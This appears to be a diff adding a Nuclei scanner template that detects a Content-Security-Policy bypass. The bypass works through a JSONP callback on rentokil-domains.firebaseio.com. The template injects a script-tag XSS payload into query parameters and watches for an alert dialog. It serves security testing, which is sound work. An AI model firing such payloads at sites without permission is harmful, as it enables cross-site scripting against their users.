@@ -1,0 +1,55 @@
+id: firebaseio-rentokil-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Firebaseio Rentokil
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,firebaseio-rentokil,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "firebaseio.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: firebaseio_rentokil_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "firebaseio_rentokil_csp_xss == true"
+# digest: 4b0a004830460221008f6906e1ea1e442d399b63ab4dea4717b37d093ef8d86e0713351ce32e415924022100bbe3be1a75c7bf417dc1a1f9e61d1dc63004ca14d3608cd0850bc57608372149:922c64590222798bb761d5b6d8e72950
